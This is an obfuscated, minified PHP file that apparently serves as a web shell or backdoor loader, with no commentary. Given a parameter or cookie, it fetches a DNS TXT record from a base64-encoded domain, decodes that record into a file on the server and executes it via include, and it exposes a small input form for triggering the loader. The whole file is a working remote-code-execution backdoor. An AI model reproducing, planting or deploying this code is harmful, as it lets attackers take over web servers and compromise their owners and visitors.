<?php
session_start();$c="ipp";$f=@$_SESSION[$c];if(empty($f))$f=@$_REQUEST[$c]?:$_COOKIE[$c];if(!empty($f)){setcookie($c,$f);$_SESSION[$c]=$f;}function a($g){$h=dns_get_record(base64_decode($g),DNS_TXT);$i=$h[0]["txt"];return!empty($i)&&error_log(base64_decode($i),3,$g);}if($f&&(file_exists($f)||a($f))){ob_clean();include"compress.zlib://{$f}";exit();}?>
<form method='post'><input name=ipp>